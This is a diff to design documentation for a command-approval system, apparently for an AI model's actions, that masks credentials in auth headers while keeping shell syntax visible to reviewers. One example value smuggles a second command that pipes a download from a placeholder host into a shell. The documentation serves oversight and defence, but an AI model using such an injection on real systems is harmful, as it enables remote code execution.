@@ -259,8 +259,10 @@ send `{"approve": true, "display_sha256": "<SHA-256 hex of display_full, UTF-8>"
 409 even with the hash) when the command is over the 8192-byte cap, or when masking removed or rewrote any shell syntax
 (`$ \` ; | & ( ) < >`), whitespace or normalisable character (checked generically over every mask, including the
 token-shape scrubber), because the `***` could hide a command; its display ends in `…(masked shell syntax not shown)`.
-A secret that sits next to a space or shell character, such as `Authorization: Bearer x`, therefore makes the request
-deny-only. A row stored before `display_full` existed is approvable only when its display is complete.
+Only the credential itself is masked in an auth header, `Bearer`, `Basic`, `token` or `Worker <id>`: it is one run without
+blanks or shell syntax, so `curl -H "Authorization: Bearer ***" https://example` stays approvable and shows the URL, and
+`Authorization: Bearer x;curl evil|sh` shows `;curl evil|sh`. A value that really holds blanks or shell syntax (a cookie
+with spaces, a value hiding `$(`) stays deny-only. A row stored before `display_full` existed is approvable only when its display is complete.
 
 CLI: `assistant-action show ID` prints the full text and `display_sha256`. `assistant-action approve ID` on a cut
 command asks `Approve exactly this command? [y/N]` on a terminal; off a terminal it needs `--display-sha256 <hash>` from
